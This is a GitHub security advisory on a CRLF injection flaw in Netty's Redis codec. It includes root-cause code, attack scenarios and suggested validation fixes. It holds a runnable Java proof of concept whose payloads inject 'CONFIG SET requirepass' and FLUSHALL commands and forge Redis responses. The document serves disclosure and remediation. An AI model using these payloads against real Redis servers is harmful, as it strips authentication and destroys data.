# [M] Netty Redis Codec Encoder has a CRLF Injection Issue

## Summary
Severity: Medium
Advisory: GHSA-rgrr-p7gp-5xj7
CVE: CVE-2026-42586
CWE: CWE-93
Ecosystem: Maven
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-rgrr-p7gp-5xj7
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-redis` — affected >=4.2.0.Alpha1 <4.2.13.Final
- Maven: `io.netty:netty-codec-redis` — affected >=0 <4.1.133.Final

## Details
# Security Vulnerability Report: CRLF Injection in Netty Redis Codec Encoder

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | Netty |
| **Version** | 4.2.12.Final (and all prior versions with codec-redis) |
| **Component** | `io.netty.handler.codec.redis.RedisEncoder` |
| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences (CRLF Injection) |
| **Impact** | Redis Command Injection / Response Poisoning |
| **Attack Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Scope** | Unchanged |
| **Confidentiality Impact** | High |
| **Integrity Impact** | High |
| **Availability Impact** | None |

## 2. Affected Components

The following classes in the `codec-redis` module are affected:

- `io.netty.handler.codec.redis.RedisEncoder` (encoder - no output validation)
- `io.netty.handler.codec.redis.InlineCommandRedisMessage` (no input validation)
- `io.netty.handler.codec.redis.SimpleStringRedisMessage` (no input validation)
- `io.netty.handler.codec.redis.ErrorRedisMessage` (no input validation)
- `io.netty.handler.codec.redis.AbstractStringRedisMessage` (base class - no validation)

## 3. Vulnerability Description

The Netty Redis codec encoder (`RedisEncoder`) writes user-controlled string content directly to the network output buffer without validating or sanitizing CRLF (`\r\n`) characters. Since the Redis Serialization Protocol (RESP) uses CRLF as the command/response delimiter, an attacker who can control the content of a Redis message can inject arbitrary Redis commands or forge fake responses.

### Root Cause

In `RedisEncoder.java`, the `writeString()` method (lines 103-111) writes content using `ByteBufUtil.writeUtf8()` without any validation:

```java
private static void writeString(ByteBufAllocator allocator, RedisMessageType type,
                                String content, List<Object> out) {
    ByteBuf buf = allocator.ioBuffer(type.length() + ByteBufUtil.utf8MaxBytes(content) +
                                     RedisConstants.EOL_LENGTH);
    type.writeTo(buf);
    ByteBufUtil.writeUtf8(buf, content);       // <-- NO CRLF VALIDATION
    buf.writeShort(RedisConstants.EOL_SHORT);   // <-- Appends \r\n
    out.add(buf);
}
```

The message constructors (`InlineCommandRedisMessage`, `SimpleStringRedisMessage`, `ErrorRedisMessage`) inherit from `AbstractStringRedisMessage`, which only checks for null:

```java
// AbstractStringRedisMessage.java:30-32
AbstractStringRedisMessage(String content) {
    this.content = ObjectUtil.checkNotNull(content, "content");
    // NO CRLF validation
}
```

### Comparison with Similar Fixed CVEs

This vulnerability follows the exact same pattern as two previously acknowledged Netty CVEs:

| CVE | Component | Fix |
|-----|-----------|-----|
| **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder - SMTP command injection | Added `SmtpUtils.validateSMTPParameters()` to check for `\r` and `\n` |
| **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder - CRLF in URI | Added `HttpUtil.validateRequestLineTokens()` to check for `\r`, `\n`, and SP |

The Redis codec has **no equivalent validation** in either the encoder or the message constructors.

## 4. Exploitability Prerequisites

This vulnerability is exploitable when **all** of the following conditions are met:

1. The application uses Netty's `codec-redis` module to communicate with a Redis server
2. User-controlled input is placed into `InlineCommandRedisMessage`, `SimpleStringRedisMessage`, or `ErrorRedisMessage` content
3. The application does **not** perform its own CRLF sanitization before constructing these message objects

**Important context**: Most production Redis clients built on Netty use the RESP array format (`ArrayRedisMessage` + `BulkStringRedisMessage`), which uses binary-safe length-prefixed encoding and is **not** affected by this vulnerability. The vulnerability specifically affects the text-based inline command mode and simple string/error response types, which use CRLF as protocol delimiters.

**Affected use cases include**:
- Custom Redis clients or proxies that use `InlineCommandRedisMessage` for simplicity
- Redis middleware/proxy layers that forward `SimpleStringRedisMessage` or `ErrorRedisMessage` responses
- Applications that construct Redis monitoring or diagnostic commands from user input
- Redis Sentinel or Cluster management tools using inline command format

## 5. Attack Scenarios

### Scenario 1: Redis Command Injection via Inline Commands

When Netty is used as a Redis client or proxy, and user-controlled data is placed into `InlineCommandRedisMessage`, an attacker can inject arbitrary Redis commands:

```java
// Application code that builds Redis commands from user input
String userKey = request.getParameter("key");  // Attacker controls this
InlineCommandRedisMessage msg = new InlineCommandRedisMessage("GET " + userKey);
channel.writeAndFlush(msg);
```

**Attack input**: `key = "foo\r\nCONFIG SET requirepass \"\"\r\nFLUSHALL"`

**Result**: Three commands sent to Redis:
1. `GET foo`
2. `CONFIG SET requirepass ""` (removes authentication!)
3. `FLUSHALL` (deletes all data!)

### Scenario 2: Redis Response Poisoning

When Netty is used as a Redis proxy/middleware, a malicious upstream Redis server (or MITM attacker) can inject fake responses:

```java
// Proxy forwarding a simple string response
SimpleStringRedisMessage response = new SimpleStringRedisMessage(upstreamResponse);
downstreamChannel.writeAndFlush(response);
```

**Malicious upstream response**: `"OK\r\n$6\r\nhacked"`

**Client sees**:
1. Simple String: `+OK` (expected response)
2. Bulk String: `$6\r\nhacked` (injected fake data!)

### Scenario 3: Error Message Injection

```java
ErrorRedisMessage error = new ErrorRedisMessage("ERR " + errorDetail);
```

**Attack input**: `errorDetail = "unknown\r\n+FAKE_SUCCESS"`

**Client sees**:
1. Error: `-ERR unknown`
2. Simple String: `+FAKE_SUCCESS` (injected fake success!)

## 6. Proof of Concept

### Full Runnable PoC Source Code (RedisEncoderCRLFInjectionPoC.java)

```java
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufUtil;
import io.netty.buffer.UnpooledByteBufAllocator;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.redis.*;

import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.ArrayList;

/**
 * PoC: Redis Encoder CRLF Injection Vulnerability
 *
 * Demonstrates that InlineCommandRedisMessage, SimpleStringRedisMessage,
 * and ErrorRedisMessage do not validate content for CRLF characters,
 * allowing Redis command injection via the RESP protocol.
 */
public class RedisEncoderCRLFInjectionPoC {

    public static void main(String[] args) {
        System.out.println("=== Netty Redis Encoder CRLF Injection PoC ===\n");

        testInlineCommandInjection();
        testSimpleStringInjection();
        testErrorMessageInjection();

        System.out.println("\n=== PoC Complete ===");
    }

    /**
     * Test 1: Inline Command Injection
     * An attacker-controlled string injected into InlineCommandRedisMessage
     * results in multiple Redis commands being sent.
     */
    static void testInlineCommandInjection() {
        System.out.println("[TEST 1] Inline Command CRLF Injection");
        System.out.println("----------------------------------------");

        // Malicious content: inject FLUSHALL after a benign PING
        String maliciousContent = "PING\r\nCONFIG SET requirepass \"\"\r\nFLUSHALL";

        EmbeddedChannel channel = new EmbeddedChannel(new RedisEncoder());

        // This should be rejected but is accepted
        InlineCommandRedisMessage msg = new InlineCommandRedisMessage(maliciousContent);
        channel.writeOutbound(msg);

        ByteBuf output = channel.readOutbound();
        String encoded = output.toString(StandardCharsets.UTF_8);
        output.release();
        channel.finishAndReleaseAll();

        System.out.println("Input:   InlineCommandRedisMessage(\"" +
                           maliciousContent.replace("\r", "\\r").replace("\n", "\\n") + "\")");
        System.out.println("Encoded: \"" +
                           encoded.replace("\r", "\\r").replace("\n", "\\n") + "\"");

        // Count how many CRLF-delimited commands are in the output
        String[] commands = encoded.split("\r\n");
        System.out.println("Number of commands parsed by Redis: " + commands.length);
        for (int i = 0; i < commands.length; i++) {
            if (!commands[i].isEmpty()) {
                System.out.println("  Command " + (i + 1) + ": " + commands[i]);
            }
        }

        boolean vulnerable = commands.length > 1;
        System.out.println("VULNERABLE: " + (vulnerable ? "YES - Multiple commands injected!" : "NO"));
        System.out.println();
    }

    /**
     * Test 2: SimpleString Response Injection
     * When Netty acts as a Redis proxy/middleware, a malicious SimpleString
     * can inject fake responses to the downstream client.
     */
    static void testSimpleStringInjection() {
        System.out.println("[TEST 2] SimpleString Response CRLF Injection");
        System.out.println("----------------------------------------------");

        // Malicious content: inject a fake bulk string response after OK
        String maliciousContent = "OK\r\n$6\r\nhacked";

        EmbeddedChannel channel = new EmbeddedChannel(new RedisEncoder());

        SimpleStringRedisMessage msg = new SimpleStringRedisMessage(maliciousContent);
        channel.writeOutbound(msg);

        ByteBuf output = channel.readOutbound();
        String encoded = output.toString(StandardCharsets.UTF_8);
        output.release();
        channel.finishAndReleaseAll();

        System.out.println("Input:   SimpleStringRedisMessage(\"" +
                           maliciousContent.replace("\r", "\\r").replace("\n", "\\n") + "\")");
        System.out.println("Encoded: \"" +
                           encoded.replace("\r", "\\r").replace("\n", "\\n") + "\"");

        // The RESP protocol uses the first byte to determine type:
        // '+' = Simple String, '$' = Bulk String
        // A client parsing this would see:
        // 1. "+OK\r\n"       -> Simple String "OK"
        // 2. "$6\r\nhacked"  -> Bulk String "hacked" (injected!)
        boolean vulnerable = encoded.contains("+OK\r\n$6\r\nhacked");
        System.out.println("VULNERABLE: " + (vulnerable ? "YES - Response poisoning possible!" : "NO"));
        System.out.println();
    }

    /**
     * Test 3: Error Message Injection
     * Similar to SimpleString but with error messages.
     */
    static void testErrorMessageInjection() {
        System.out.println("[TEST 3] Error Message CRLF Injection");
        System.out.println("--------------------------------------");

        String maliciousContent = "ERR unknown\r\n+INJECTED_OK";

        EmbeddedChannel channel = new EmbeddedChannel(new RedisEncoder());

        ErrorRedisMessage msg = new ErrorRedisMessage(maliciousContent);
        channel.writeOutbound(msg);

        ByteBuf output = channel.readOutbound();
        String encoded = output.toString(StandardCharsets.UTF_8);
        output.release();
        channel.finishAndReleaseAll();

        System.out.println("Input:   ErrorRedisMessage(\"" +
                           maliciousContent.replace("\r", "\\r").replace("\n", "\\n") + "\")");
        System.out.println("Encoded: \"" +
                           encoded.replace("\r", "\\r").replace("\n", "\\n") + "\"");

        boolean vulnerable = encoded.contains("-ERR unknown\r\n+INJECTED_OK");
        System.out.println("VULNERABLE: " + (vulnerable ? "YES - Error + fake OK injected!" : "NO"));
        System.out.println();
    }
}
```

### How to Compile and Run

```bash
# Build Netty (skip tests for speed)
./mvnw install -pl common,buffer,codec,codec-redis,transport -DskipTests -Dcheckstyle.skip=true \
  -Denforcer.skip=true -Djapicmp.skip=true -Danimal.sniffer.skip=true \
  -Drevapi.skip=true -Dforbiddenapis.skip=true -Dspotbugs.skip=true -q

# Set classpath
JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path "*/4.2.12.Final/*" \
  | grep -v sources | grep -v javadoc | tr '\n' ':')

# Compile and run
javac -cp "$JARS" RedisEncoderCRLFInjectionPoC.java
java -cp "$JARS:." RedisEncoderCRLFInjectionPoC
```

### PoC Execution Output (Verified on Netty 4.2.12.Final)

```
=== Netty Redis Encoder CRLF Injection PoC ===

[TEST 1] Inline Command CRLF Injection
----------------------------------------
Input:   InlineCommandRedisMessage("PING\r\nCONFIG SET requirepass ""\r\nFLUSHALL")
Encoded: "PING\r\nCONFIG SET requirepass ""\r\nFLUSHALL\r\n"
Number of commands parsed by Redis: 3
  Command 1: PING
  Command 2: CONFIG SET requirepass ""
  Command 3: FLUSHALL
VULNERABLE: YES - Multiple commands injected!

[TEST 2] SimpleString Response CRLF Injection
----------------------------------------------
Input:   SimpleStringRedisMessage("OK\r\n$6\r\nhacked")
Encoded: "+OK\r\n$6\r\nhacked\r\n"
VULNERABLE: YES - Response poisoning possible!

[TEST 3] Error Message CRLF Injection
--------------------------------------
Input:   ErrorRedisMessage("ERR unknown\r\n+INJECTED_OK")
Encoded: "-ERR unknown\r\n+INJECTED_OK\r\n"
VULNERABLE: YES - Error + fake OK injected!


=== PoC Complete ===
```

## 7. Impact Analysis

| Impact Category | Description |
|----------------|-------------|
| **Confidentiality** | HIGH - Attacker can execute `CONFIG GET` to extract sensitive Redis configuration, use `KEYS *` to enumerate all data |
| **Integrity** | HIGH - Attacker can execute `SET`/`DEL`/`FLUSHALL` to modify or destroy data, `CONFIG SET` to change server configuration |
| **Availability** | Can be HIGH - `FLUSHALL` destroys all data, `SHUTDOWN` stops the server, `DEBUG SLEEP` causes DoS |
| **Authentication Bypass** | `CONFIG SET requirepass ""` removes authentication |
| **Data Exfiltration** | Lua scripting via `EVAL` enables complex data extraction |

## 8. Remediation Recommendations

### Option 1: Validate in Message Constructors (Recommended)

Add CRLF validation to `AbstractStringRedisMessage`:

```java
AbstractStringRedisMessage(String content) {
    this.content = ObjectUtil.checkNotNull(content, "content");
    validateContent(content);
}

private static void validateContent(String content) {
    for (int i = 0; i < content.length(); i++) {
        char c = content.charAt(i);
        if (c == '\r' || c == '\n') {
            throw new IllegalArgumentException(
                "Redis message content contains illegal CRLF character at index " + i);
        }
    }
}
```

### Option 2: Validate in Encoder (Defense-in-Depth)

Add validation in `RedisEncoder.writeString()`:

```java
private static void writeString(ByteBufAllocator allocator, RedisMessageType type,
                                String content, List<Object> out) {
    for (int i = 0; i < content.length(); i++) {
        char c = content.charAt(i);
        if (c == '\r' || c == '\n') {
            throw new RedisCodecException(
                "Redis message content contains CRLF at index " + i);
        }
    }
    // ... existing encoding logic
}
```

### Option 3: Both (Best Practice)

Apply validation in both the constructor and the encoder, following the pattern used for SMTP:
- `SmtpUtils.validateSMTPParameters()` validates in `DefaultSmtpRequest` constructor
- This provides defense-in-depth against custom `SmtpRequest` implementations

## 9. Resources

- [RESP Protocol Specification](https://redis.io/docs/reference/protocol-spec/)
- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)
- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)
- [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)

## References
- https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4
- https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86
- https://github.com/netty/netty/security/advisories/GHSA-rgrr-p7gp-5xj7
- https://nvd.nist.gov/vuln/detail/CVE-2026-42586
- https://github.com/netty/netty
- https://redis.io/docs/reference/protocol-spec
